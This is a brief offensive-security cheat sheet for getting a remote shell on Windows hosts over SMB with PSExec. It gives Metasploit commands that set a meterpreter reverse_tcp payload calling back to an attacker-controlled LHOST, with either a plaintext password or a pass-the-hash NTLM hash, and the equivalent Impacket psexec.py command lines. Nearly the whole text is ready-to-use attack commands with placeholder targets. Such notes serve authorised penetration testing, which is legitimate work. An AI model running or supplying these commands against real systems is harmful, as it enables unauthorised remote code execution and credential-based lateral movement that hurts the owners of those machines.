# Gaining Shell Access

Gain remote shell access via SMB using PSExec (password or hash-based attacks).

## PSExec with Metasploit

### Setup
```bash
$ msfconsole
> search psexec
> use exploit/windows/smb/psexec
> set PAYLOAD windows/x64/meterpreter/reverse_tcp
> set LHOST <your-ip>
> set LPORT <port>
```

### Password Attack
```bash
> set SMBDOMAIN <domain>
> set SMBUSER <user>
> set SMBPASS <password>
> set RHOSTS <target-ip>
> exploit
```

### Hash Attack (Pass-the-Hash)
```bash
> set SMBUSER administrator
> unset SMBDOMAIN
> set SMBPASS <ntlm-hash>
> set RHOSTS <target-ip>
> exploit
```

## Manual PSExec (Python)

```bash
# With password
$ psexec.py domain/user:password@<target-ip> cmd

# With hash
$ psexec.py -hashes :<hash> domain/user@<target-ip>
```


